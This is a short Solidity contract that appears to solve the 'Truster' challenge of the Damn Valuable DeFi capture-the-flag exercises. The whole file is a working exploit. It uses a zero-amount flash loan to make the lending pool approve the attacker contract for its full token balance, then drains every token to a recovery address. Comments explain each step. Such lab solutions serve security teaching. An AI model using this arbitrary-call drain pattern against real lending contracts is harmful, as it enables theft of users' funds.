// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract HackerTruster {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 balance = token.balanceOf(address(pool));

        // Flash loan 0 tokens, but make the pool call token.approve(this, balance).
        // Since msg.sender inside functionCall is the pool, the pool approves us.
        bytes memory approveData = abi.encodeCall(token.approve, (address(this), balance));
        pool.flashLoan(0, address(this), address(token), approveData);

        // Now we have approval — drain the pool to recovery
        token.transferFrom(address(pool), recovery, balance);
    }
    
}
